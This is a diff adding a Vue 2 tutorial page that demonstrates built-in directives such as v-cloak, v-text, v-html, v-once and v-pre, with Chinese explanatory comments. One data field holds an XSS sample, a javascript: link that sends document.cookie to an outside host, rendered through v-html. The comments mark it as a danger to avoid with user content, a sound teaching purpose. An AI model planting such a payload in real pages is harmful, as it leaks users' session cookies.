@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>内置指令</title>
+    <!-- 
+        v-bind单项数据绑定
+        v-model双向数据绑定
+        v-for遍历对象数组字符串
+        v-on绑定事件监听，简写为@
+        v-if v-else条件渲染,动态控制节点是否存在
+        v-show条件渲染,动态控制节点是否展示
+        
+        v-text向所在的标签插入实例
+        v-html支持页面结构的解析
+        v-cloak有数据才显示,没model不显示{{}}
+        v-once只读一次,初次动态渲染后,就是静态内容,之后data改变,但是其不会随之更新
+        v-pre逃过所在节点的编译过程,直接展示,利用它跳过没有使用指令插值语法的节点
+     -->
+     <!-- 引入外部js:文件加载延迟,页面会怎样--页面阻塞,不会出现下面的部分 -->
+     <script src="./vue.js"></script>
+     <style>
+        [v-cloak]{
+            display: none;
+            /* 网速过慢,不要将未经解析的模板展示在页面
+            含有此命令的样式为不展示
+            当数据流入页面时,v-cloak自动消失 */
+        }
+     </style>
+</head>
+<body>
+    <div id="root">
+        <div v-cloak>hello,{{name}}</div>
+        <!-- v-text并不能解析标签,只是将实例插入标签,替换节点中的内容 -->
+        <div v-text="content">hello,</div>
+        <!-- v-html能解析标签,将实例插入标签,替换节点中的内容 -->
+        <div v-html="content">hello,</div>
+        <!-- 危险:xss攻击冒充用户名密码,永远不要在用户提交的内容上使用 -->
+        <div v-html="str2"></div>
+        <!-- v-pre跳过没有使用插值\指令语法的节点编译 -->
+        <div v-once>初始的n为{{n}}</div>
+        <h2 v-pre>其实vue很简单</h2>
+        <div v-pre>当前的n为{{n}}</div>
+        <button @click="n++" v-pre>点我n加一</button>
+    </div>
+    <script>
+        Vue.config.productionTip = false;
+        new Vue({
+            el:'#root',
+            data(){
+                return {
+                    name:"wxr",
+                    content:'<h3>你好啊</h3>',
+                    n:1,
+                    str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我</a>'
+                    // 造成cookie泄露
+                }
+            }
+        })
+    </script>
+</body>
+</html>
